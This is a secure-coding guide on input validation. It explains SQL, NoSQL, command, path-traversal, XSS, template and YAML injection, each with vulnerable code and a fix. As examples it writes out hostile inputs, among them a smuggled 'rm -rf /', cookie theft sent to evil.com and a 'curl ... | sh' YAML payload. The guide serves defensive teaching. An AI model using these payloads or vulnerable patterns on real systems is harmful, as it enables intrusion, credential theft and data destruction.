# Guide 04 — Input Validation and Injection Prevention

> **Who this is for:** You accept user input in your app (forms, URL parameters, file uploads, API payloads). This guide shows you how attackers use that input to take over your app, and how to stop them.

---

## The Golden Rule

**Never trust user input. Always validate, sanitize, or parameterize before use.**

User input includes: form fields, URL parameters, JSON payloads, file names, HTTP headers, query strings, and anything else that comes from outside your application. All of it is potentially hostile.

---

## INJ001 — SQL Injection

SQL injection has been the #1 web vulnerability for 20+ years. It happens when user input is embedded directly into a SQL query string.

### What it looks like

```python
# DANGEROUS — direct string interpolation
username = request.args.get("username")
cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")

# An attacker submits: ' OR '1'='1
# The query becomes: SELECT * FROM users WHERE username = '' OR '1'='1'
# This returns ALL users, bypassing login!
```

### The fix: Parameterized queries

```python
# SAFE — the database driver handles escaping
username = request.args.get("username")
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))

# SQLAlchemy ORM (safest — use this instead of raw SQL):
user = User.query.filter_by(username=username).first()

# Node.js with pg:
const result = await pool.query(
  'SELECT * FROM users WHERE username = $1',
  [username]
);
```

**The key insight:** The `?` or `$1` placeholder tells the database driver to treat the value as data, not as SQL syntax. No matter what the user submits, it can't change the query structure.

---

## INJ002 — NoSQL Injection

MongoDB queries are objects, not strings — but they're still injectable when user input is used as query operators.

### What it looks like

```javascript
// DANGEROUS — user can inject MongoDB operators
const user = await db.users.findOne({
  username: req.body.username,
  password: req.body.password  // Attacker sends: {"$gt": ""}
});
// The query becomes: { password: { $gt: "" } }
// This matches ANY user whose password is greater than empty string
// = every user → authentication bypassed!
```

### The fix

```javascript
// Option 1: Use a schema validator (Mongoose)
const UserSchema = new mongoose.Schema({
  username: { type: String, required: true },
  password: { type: String, required: true },
});
// Mongoose casts values to their schema types, preventing operator injection

// Option 2: Explicitly type-check inputs
const username = String(req.body.username); // Force to string
const password = String(req.body.password); // Force to string

// Option 3: Strip keys starting with $
function sanitizeQuery(obj) {
  for (const key of Object.keys(obj)) {
    if (key.startsWith('$')) delete obj[key];
  }
  return obj;
}
```

---

## INJ003 — Command Injection

Command injection lets attackers run arbitrary operating system commands on your server.

### What it looks like

```python
# DANGEROUS — user controls shell command
filename = request.args.get("file")
os.system(f"convert {filename} output.pdf")

# Attacker submits: report.pdf; rm -rf /
# Shell executes: convert report.pdf; rm -rf /
# Your entire filesystem is deleted.
```

### The fix

```python
import subprocess

# SAFE — use argument list, not shell string
filename = request.args.get("file")

# Validate input first
if not filename.endswith('.pdf') or '/' in filename or '..' in filename:
    return "Invalid filename", 400

# subprocess with shell=False (default) never passes to shell
subprocess.run(["convert", filename, "output.pdf"], shell=False)
```

```javascript
// Node.js — use execFile instead of exec
const { execFile } = require('child_process');
execFile('convert', [filename, 'output.pdf'], callback);
// execFile never uses a shell — arguments can't inject commands
```

---

## INJ004 — Path Traversal

Path traversal lets attackers read files outside your intended directory using `../` sequences.

### What it looks like

```python
# DANGEROUS — user controls file path
filename = request.args.get("file")
with open(filename) as f:
    return f.read()

# Attacker submits: ../../etc/passwd
# Your app reads: /etc/passwd (system password file)
```

### The fix

```python
from pathlib import Path

BASE_DIR = Path("/safe/uploads").resolve()

def safe_read(filename):
    # Resolve the full path (collapses ../ sequences)
    requested = (BASE_DIR / filename).resolve()

    # Verify it's still inside the base directory
    if not str(requested).startswith(str(BASE_DIR)):
        return "Access denied", 403

    return requested.read_text()
```

```javascript
// Node.js
const path = require('path');
const BASE_DIR = path.resolve('/safe/uploads');

function safeRead(filename) {
  const requested = path.resolve(BASE_DIR, filename);

  // Ensure the resolved path is inside BASE_DIR
  if (!requested.startsWith(BASE_DIR + path.sep)) {
    throw new Error('Access denied');
  }

  return fs.readFileSync(requested, 'utf-8');
}
```

---

## INJ005 — Cross-Site Scripting (XSS)

XSS lets attackers inject JavaScript that runs in other users' browsers. The injected script can steal session cookies, redirect to phishing pages, or perform actions as the victim.

### What it looks like

```javascript
// DANGEROUS — user input inserted as raw HTML
document.getElementById('comment').innerHTML = userComment;

// Attacker submits: <script>document.location='https://evil.com?c='+document.cookie</script>
// Every user who views the page sends their session cookie to the attacker
```

### The fix

```javascript
// SAFE — textContent treats input as text, not HTML
document.getElementById('comment').textContent = userComment;

// React — JSX auto-escapes by default (safe)
function Comment({ text }) {
  return <div>{text}</div>; // Safe — React escapes this
}

// When you MUST render HTML (e.g., rich text editors):
import DOMPurify from 'dompurify';
// Sanitize first, then render
element.innerHTML = DOMPurify.sanitize(userHtml, { ALLOWED_TAGS: ['b', 'i', 'em'] });
```

**Never use `dangerouslySetInnerHTML` with unsanitized input in React.**

---

## INJ006 — Template Injection (SSTI)

Server-side template injection happens when user input is used as the template itself, rather than data passed into a template.

### What it looks like

```python
# DANGEROUS — user input is the template
from flask import render_template_string, request

template = request.args.get("greeting")
return render_template_string(template)

# Attacker submits: {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
# Jinja2 evaluates this and returns the contents of /etc/passwd
# This is remote code execution!
```

### The fix

```python
# SAFE — user input is DATA, not the template
from flask import render_template, request

name = request.args.get("name", "World")
return render_template("greet.html", name=name)  # Jinja2 escapes {{ name }}
```

```
{# In greet.html — Jinja2 auto-escapes user data #}
<h1>Hello, {{ name }}!</h1>
```

**The rule:** Template FILES are safe (you control them). Template STRINGS from user input are dangerous (they control them).

---

## INJ007 — Unsafe YAML Loading

YAML can embed executable Python code. Using `yaml.load()` without a safe loader is equivalent to `eval()`.

### What it looks like

```python
# DANGEROUS — yaml.load() can execute arbitrary Python
import yaml
config = yaml.load(user_input)

# Attacker submits:
# !!python/object/apply:os.system ['curl https://evil.com/shell | sh']
# This executes a shell command on your server
```

### The fix

```python
import yaml

# SAFE — safe_load only parses basic data types
config = yaml.safe_load(user_input)

# Or explicitly with SafeLoader:
config = yaml.load(user_input, Loader=yaml.SafeLoader)

# For output:
output = yaml.safe_dump(data)  # Not yaml.dump()
```

---

## Input Validation Checklist

- [ ] All database queries use parameterized statements or an ORM
- [ ] Shell commands use argument arrays with `shell=False`
- [ ] File paths are resolved with `realpath()` and validated against a base directory
- [ ] User input is never passed to `render_template_string()` or `Template()`
- [ ] HTML output uses `textContent`, not `innerHTML`, for user data
- [ ] YAML is loaded with `yaml.safe_load()`, not `yaml.load()`
- [ ] MongoDB queries type-cast inputs and strip `$`-prefixed keys
- [ ] File upload names are validated (allowlist of extensions, no path separators)

---

*Next: [Guide 06 — Deployment Hardening](06-deployment-hardening.md)*
